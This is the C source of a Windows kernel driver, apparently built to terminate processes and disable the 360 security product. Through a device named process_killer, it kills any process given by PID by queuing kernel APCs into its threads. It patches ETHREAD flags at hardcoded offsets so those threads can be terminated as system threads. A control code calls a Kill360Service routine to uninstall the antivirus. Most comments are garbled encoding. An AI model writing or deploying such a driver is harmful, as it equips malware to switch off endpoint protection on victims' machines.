#include <ntddk.h>
#include <wdm.h>
#include "struct.h"
#include "uninst_360.h"
typedef unsigned char  BYTE,  *PBYTE;

typedef struct _DEVICE_EXTENSION 
{
	PDEVICE_OBJECT pDevice; 
	UNICODE_STRING ustrDeviceName;    //�豸����     
	UNICODE_STRING ustrSymLinkName;    //����������  
} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

#define CTL_CODE_360	CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_IN_DIRECT, FILE_ANY_ACCESS)

VOID DriverUnload(PDRIVER_OBJECT driver);
NTSTATUS MyDispatchFunction(PDEVICE_OBJECT device,PIRP irp);
NTSTATUS CreateDevice (IN PDRIVER_OBJECT pDriverObject); 
NTSTATUS MyOpenProcess(HANDLE PID, PHANDLE pHandle,ACCESS_MASK DesiredAccess);
void MyTerminateProcess(HANDLE hProcess);
NTSTATUS MyKillProcess(HANDLE Pid);
VOID  KillProcessWithApc(ULONG epro);
VOID  KillProcessWithApcXp(ULONG epro);

static size_t s_cf_proc_name_offset = 0;
void cfCurProcNameInit()
{
	ULONG i;
	PEPROCESS  curproc;
	curproc = PsGetCurrentProcess();
	// ����EPROCESS�ṹ���������ҵ��ַ���
	for(i=0;i<3*4*1024;i++)
	{
		if(!strncmp("System",(PCHAR)curproc+i,strlen("System"))) 
		{
			s_cf_proc_name_offset = i;
			break;
		}
	}
}

NTSTATUS DriverEntry(PDRIVER_OBJECT driver,PUNICODE_STRING reg_path)
{
	NTSTATUS status = STATUS_SUCCESS;
	
	

	driver->DriverUnload = DriverUnload;
	driver->MajorFunction[IRP_MJ_CREATE] = MyDispatchFunction;     
	driver->MajorFunction[IRP_MJ_CLOSE] = MyDispatchFunction;   
	driver->MajorFunction[IRP_MJ_WRITE] = MyDispatchFunction;   
	driver->MajorFunction[IRP_MJ_READ] = MyDispatchFunction; 
	driver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyDispatchFunction; 

	status = CreateDevice(driver);



	cfCurProcNameInit();
		DbgPrint("DriverEntry %x",s_cf_proc_name_offset);
	return status;
}
VOID DriverUnload(PDRIVER_OBJECT driver)
{
	PDEVICE_OBJECT    pNextObj; 
	pNextObj = driver->DeviceObject;    
	DbgPrint("DriverUnload.");
	while (pNextObj != NULL)     
	{       
		PDEVICE_EXTENSION pDevExt = (PDEVICE_EXTENSION)pNextObj->DeviceExtension;   
		//ɾ����������         
		UNICODE_STRING pLinkName = pDevExt->ustrSymLinkName;    
		IoDeleteSymbolicLink(&pLinkName);       
		pNextObj = pNextObj->NextDevice;        
		IoDeleteDevice( pDevExt->pDevice );     
	} 
}
ULONG cfCurProcName(PUNICODE_STRING name)
{
	PEPROCESS  curproc;
	ULONG  i,need_len;
	ANSI_STRING ansi_name;
	if(s_cf_proc_name_offset == 0)
		return 0;

	// ��õ�ǰ����PEB,Ȼ���ƶ�һ��ƫ�Ƶõ�����������λ�á�
	curproc = PsGetCurrentProcess();

	// ���������ansi�ַ���������ת��Ϊunicode�ַ�����
	RtlInitAnsiString(&ansi_name,((PCHAR)curproc + s_cf_proc_name_offset));
	need_len = RtlAnsiStringToUnicodeSize(&ansi_name);
	if(need_len > name->MaximumLength)
	{
		return RtlAnsiStringToUnicodeSize(&ansi_name);
	}
	RtlAnsiStringToUnicodeString(name,&ansi_name,FALSE);
	return need_len;
}
NTSTATUS MyDispatchFunction(PDEVICE_OBJECT device,PIRP irp)
{
	PIO_STACK_LOCATION irpsp = IoGetCurrentIrpStackLocation(irp);
	NTSTATUS status = STATUS_SUCCESS;

	PEPROCESS  EProcess = NULL;
	WCHAR name_buf[32] = {0};
	UNICODE_STRING proc_name = {0};
	RtlInitEmptyUnicodeString(&proc_name,name_buf,sizeof(WCHAR)*32);

	DbgPrint("MyDispatchFunction Begin %d",irpsp->MajorFunction);
	switch(irpsp->MajorFunction)
	{
	case IRP_MJ_WRITE:
		{
			PBYTE buffer = NULL;
			if(irp->MdlAddress != NULL)
			{
				buffer = (PBYTE)MmGetSystemAddressForMdlSafe(irp->MdlAddress,NormalPagePriority);
			}
			else
			{
				buffer = (PBYTE)irp->UserBuffer;
			}
			if(buffer == NULL)
			{
				buffer = (PBYTE)irp->AssociatedIrp.SystemBuffer;
			}
			//cfCurProcName(&proc_name);
			

			status = PsLookupProcessByProcessId(*(PHANDLE)buffer, &EProcess);
			DbgPrint("irp_mj_write %d name=%s",*((int*)buffer),((PCHAR)EProcess + s_cf_proc_name_offset));
			/*if(NT_SUCCESS(status))
			{
				DbgPrint("eprocess %s",(BYTE*)&EProcess + 0x16c);
			}*/
			
			KillProcessWithApcXp(EProcess);

			//MyKillProcess(*(PHANDLE)buffer);
			
		}
		break;
	case IRP_MJ_DEVICE_CONTROL:
		{
			ULONG code = irpsp->Parameters.DeviceIoControl.IoControlCode;
			if(code == CTL_CODE_360)
			{
				DbgPrint("Driver Uninstall 360");
				Kill360Service();
			}
		}
		break;
	default:
		break;
	}
	return STATUS_SUCCESS;
}
NTSTATUS CreateDevice (IN PDRIVER_OBJECT    pDriverObject)   
{      
	NTSTATUS status; 
	PDEVICE_OBJECT pDevObj;   
	PDEVICE_EXTENSION pDevExt;      
	//�����豸����    
	UNICODE_STRING devName;   
	UNICODE_STRING symLinkName;
	RtlInitUnicodeString(&devName,L"\\Device\\process_killer");    
	//�����豸     
	status = IoCreateDevice( pDriverObject,     
		sizeof(DEVICE_EXTENSION),          
		&devName,              
		FILE_DEVICE_UNKNOWN,//�����豸Ϊ��ռ�豸        
		0, 
		TRUE,
		&pDevObj );   
	if (!NT_SUCCESS(status))       
		return status;
	pDevObj->Flags |= DO_BUFFERED_IO;   
	pDevExt = (PDEVICE_EXTENSION)pDevObj->DeviceExtension;   
	pDevExt->pDevice = pDevObj;
	pDevExt->ustrDeviceName = devName;
	//������������
	
	RtlInitUnicodeString(&symLinkName,L"\\??\\process_killer_sl");   
	pDevExt->ustrSymLinkName = symLinkName;    
	status = IoCreateSymbolicLink( &symLinkName,&devName );   
	if (!NT_SUCCESS(status))     
	{       
		IoDeleteDevice( pDevObj );  
		return status;     
	}      
	return STATUS_SUCCESS;  
}  


NTSTATUS MyOpenProcess(HANDLE PID, PHANDLE pHandle,ACCESS_MASK DesiredAccess)
{
	NTSTATUS  status=0;
	PEPROCESS  EProcess = NULL;
	HANDLE    handle = NULL;
	UNICODE_STRING y;
	PULONG    PsProcessType;

	status = PsLookupProcessByProcessId(PID, &EProcess);
	if (NT_SUCCESS(status))
	{
		handle = 0;
		RtlInitUnicodeString(&y, L"PsProcessType");
		PsProcessType =(PULONG) MmGetSystemRoutineAddress(&y);
		if (PsProcessType)
		{
			status = ObOpenObjectByPointer(EProcess, 0, 0,  DesiredAccess, (POBJECT_TYPE)*PsProcessType, UserMode, &handle);
			if (NT_SUCCESS(status))
			{
				*pHandle = handle;
			}
		}
		ObfDereferenceObject(EProcess);
	} 
	return status;
}
void MyTerminateProcess(HANDLE hProcess)
{
	NTSTATUS s=	ZwTerminateProcess(hProcess,0);
	DbgPrint("ZwTerminateProcess handle=%x ret=%x",hProcess,s);

	//OBJECT_ATTRIBUTES objOa;
	//NTSTATUS st;
	//HANDLE hJob;
	////////////////////////////////
	//RtlZeroMemory(&objOa,sizeof(OBJECT_ATTRIBUTES));
	/////////////////////////////////////////
	//objOa.Length = sizeof (OBJECT_ATTRIBUTES);
	//st = ZwCreateJobObject(&hJob, 0, &objOa);
	//if (NT_SUCCESS (st))
	//{
	//	ZwAssignProcessToJobObject(hJob, (HANDLE)hProcess);
	//	ZwTerminateJobObject((HANDLE)hJob,0);
	//	ZwClose (hJob);
	//	ZwClose ((HANDLE)hProcess);
	//}
}
NTSTATUS MyKillProcess(HANDLE Pid)
{
	HANDLE hProcess;
	NTSTATUS ret= MyOpenProcess(Pid,&hProcess,1);
	DbgPrint("MyOpenProcess %x",ret);
	MyTerminateProcess(hProcess);
	return ret;
}

//===========================================��APCɱ����=================================================
//���̽�����Ļ��
//
//
//
//ԭ���������������߳�---��ʼ��APC---����APC
//�����̵߳��ں�Apc����

#define PS_CROSS_THREAD_FLAGS_SYSTEM 0x00000010UL

//typedef enum _KAPC_ENVIRONMENT {
//	OriginalApcEnvironment,
//	AttachedApcEnvironment,
//	CurrentApcEnvironment,
//	InsertApcEnvironment
//} KAPC_ENVIRONMENT;

VOID KeInitializeApc (
					  PKAPC Apc,
					  PETHREAD Thread,
					  KAPC_ENVIRONMENT Environment,
					  PKKERNEL_ROUTINE KernelRoutine,
					  PKRUNDOWN_ROUTINE RundownRoutine,
					  PKNORMAL_ROUTINE NormalRoutine,
					  KPROCESSOR_MODE ProcessorMode,
					  PVOID NormalContext
					  );

BOOLEAN KeInsertQueueApc(PKAPC Apc,PVOID SystemArg1,PVOID SystemArg2,KPRIORITY Increment);

VOID  KernelKillThreadRoutine(IN PKAPC Apc,
							  IN OUT PKNORMAL_ROUTINE *NormalRoutine,
							  IN OUT PVOID *NormalContext,
							  IN OUT PVOID *SystemArgument1,
							  IN OUT PVOID *SystemArgument2)
{
	//����PsTerminateSystemThread�����߳�
	//�޸ĵ�ǰ�̵߳�ThreadFlagsΪϵͳ�߳�
	PULONG ThreadFlags;
	ExFreePool(Apc);  //�ͷ�APC
	ThreadFlags=(ULONG *)((ULONG)PsGetCurrentThread()+0x248);  //ETHREAD��CrossThreadFlags��ƫ����Ϊ0x248
	if(MmIsAddressValid(ThreadFlags))   //��ַ��������֤
	{
		*ThreadFlags=(*ThreadFlags) | PS_CROSS_THREAD_FLAGS_SYSTEM; //�޸�ΪϵͳȨ��
		PsTerminateSystemThread(STATUS_SUCCESS); //����ϵͳ�̣߳���Ҫ�޸�Ȩ��
		//PspExitThread(STATUS_SUCCESS);����PspTerminateThreadByPointer��λPspExitThread��ַ
	}
	DbgPrint("KernelKillThreadRoutine %d",Apc);
}

#define MEM_TAG 'myTt'//
VOID  KillProcessWithApc(ULONG epro)
{
	//�����߳���2��������1��PsGetNextProcessThread(δ�����������Լ���λ��ַ)  2����EPROCESS��list����ActiveThreads��¼�߳�����
	//3������pspcidtable
	BOOLEAN status;
	PKAPC ExitApc=NULL;
	PETHREAD  ethread;
	ULONG i;
	ULONG num;   //�߳�����
	ULONG Head;  //����ͷ
	ULONG address;//��ַ
	num=*(ULONG *)(epro+0x198);   //EPROCESS��ActiveThreads������  0x1a0��EPROCESS��ActiveThread��ƫ����
	KdPrint(("[RecordThreadAddress] num: 0x%x\n",num));    //��ӡ�߳�����
	Head=epro+0x0b8;              //List_entry��һ���ڵ��ַ
	for(i=0;i<num;i++)
	{   
		//��¼�̵߳�ַ
		Head=(ULONG)((PLIST_ENTRY)Head)->Flink;
		address=Head-0x22c;
		KdPrint(("[RecordThreadAddress] address: 0x%x\n",address));      //��ӡ�̵߳�ַ
		ethread=(PETHREAD)address;                                       //ת�����߳�ָ�� 
		ExitApc=(PKAPC)ExAllocatePoolWithTag(NonPagedPool,sizeof(KAPC),MEM_TAG);
		if(ExitApc==NULL)
		{
			KdPrint(("[KillProcessWithApc] malloc memory failed \n"));
			return;
		}
		KeInitializeApc(ExitApc,
			ethread,                         //�߳�
			OriginalApcEnvironment,
			KernelKillThreadRoutine,
			NULL,
			NULL,
			KernelMode,
			NULL);//Ϊ�̳߳�ʼ��APC
		status=KeInsertQueueApc(ExitApc,ExitApc,NULL,2);   //����Apc���̶߳���
		//if(status==STATUS_SUCCESS)
		//	KdPrint(("KeInsertQueueApc  success\n"));  
		//else
		//	KdPrint(("KeInsertQueueApc  failed\n"));
	}
}
VOID  KillProcessWithApcXp(ULONG epro)
{
	//�����߳���2��������1��PsGetNextProcessThread(δ�����������Լ���λ��ַ)  2����EPROCESS��list����ActiveThreads��¼�߳�����
	//3������pspcidtable
	BOOLEAN status;
	PKAPC ExitApc=NULL;
	PEPROCESS eprocess;
	PETHREAD  ethread;
	ULONG i;
	ULONG num;   //�߳�����
	ULONG Head;  //����ͷ
	ULONG address;//��ַ
	num=*(ULONG *)(epro+0x1a0);   //EPROCESS��ActiveThreads������  0x1a0��EPROCESS��ActiveThread��ƫ����
	KdPrint(("[RecordThreadAddress] num: 0x%x\n",num));    //��ӡ�߳�����
	Head=epro+0x190;              //List_entry��һ���ڵ��ַ
	for(i=0;i<num;i++)
	{   
		//��¼�̵߳�ַ
		Head=(ULONG)((PLIST_ENTRY)Head)->Flink;
		address=Head-0x22c;
		KdPrint(("[RecordThreadAddress] address: 0x%x\n",address));      //��ӡ�̵߳�ַ
		ethread=(PETHREAD)address;                                       //ת�����߳�ָ�� 
		ExitApc=(PKAPC)ExAllocatePoolWithTag(NonPagedPool,sizeof(KAPC),MEM_TAG);
		if(ExitApc==NULL)
		{
			KdPrint(("[KillProcessWithApc] malloc memory failed \n"));
			return;
		}
		KeInitializeApc(ExitApc,
			ethread,                         //�߳�
			OriginalApcEnvironment,
			KernelKillThreadRoutine,
			NULL,
			NULL,
			KernelMode,
			NULL);//Ϊ�̳߳�ʼ��APC
		status=KeInsertQueueApc(ExitApc,0,0,0);   //����Apc���̶߳���
		if(status==STATUS_SUCCESS)
			KdPrint(("KeInsertQueueApc  success\n"));  
		else
			KdPrint(("KeInsertQueueApc  failed %x\n",status));
	}
}